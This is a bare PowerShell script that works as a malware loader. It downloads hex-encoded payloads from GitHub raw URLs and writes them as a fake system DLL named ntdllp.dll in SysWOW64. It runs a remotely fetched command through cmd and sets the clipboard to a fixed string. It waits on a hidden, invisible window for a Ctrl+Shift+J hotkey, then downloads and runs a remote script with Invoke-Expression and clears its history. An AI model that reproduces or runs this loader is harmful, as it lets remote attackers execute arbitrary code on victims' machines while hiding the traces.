Add-Type -AssemblyName System.Windows.Forms
$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.ps1"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
$clipText = "SteF6b2WrAgu"
function HexToBytes {
    param([string]$hexStr)
    $cleanHex = [regex]::Replace($hexStr, '[^0-9A-Fa-f]', '')
    if ($cleanHex.Length % 2 -ne 0) {
        return $null
    }
    $byteArr = [byte[]]::new($cleanHex.Length / 2)
    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($cleanHex.Substring($i, 2), 16)
    }
    return $byteArr
}
try {
    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing -TimeoutSec 30
    $hexContent = $responseA.Content
    $bytes = HexToBytes $hexContent
    if ($bytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $bytes)
    }
} catch {}
Set-Clipboard $clipText
try {
    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing -TimeoutSec 30
    $cmdToRun = $responseB.Content.Trim()
    if ($cmdToRun) {
        Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
    }
} catch {}
try {
    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 30
    $newHexContent = $responseC.Content
    $newBytes = HexToBytes $newHexContent
    if ($newBytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $newBytes)
    }
} catch {}
$script:continueExecution = $false
$global:HotkeyHandler = {
    if ($_.KeyCode -eq [System.Windows.Forms.Keys]::J -and 
        [System.Windows.Forms.Control]::ModifierKeys -eq ([System.Windows.Forms.Keys]::Control -bor [System.Windows.Forms.Keys]::Shift)) {
        $script:continueExecution = $true
    }
}
$form = New-Object System.Windows.Forms.Form
$form.Size = New-Object System.Drawing.Size(100, 100)
$form.Opacity = 0
$form.ShowInTaskbar = $false
$form.StartPosition = "Manual"
$form.Location = New-Object System.Drawing.Point(-2000, -2000)
$form.add_KeyDown($global:HotkeyHandler)
$form.Show()
$form.Activate()
do {
    Start-Sleep -Milliseconds 100
} while (-not $script:continueExecution)
$form.Close()
try {
    $responseD = Invoke-WebRequest -Uri $urlD -UseBasicParsing -TimeoutSec 30
    $finalScriptContent = $responseD.Content.Trim()
    if ($finalScriptContent) {
        Invoke-Expression $finalScriptContent
    }
} catch {}
Clear-History -ErrorAction SilentlyContinue
exit
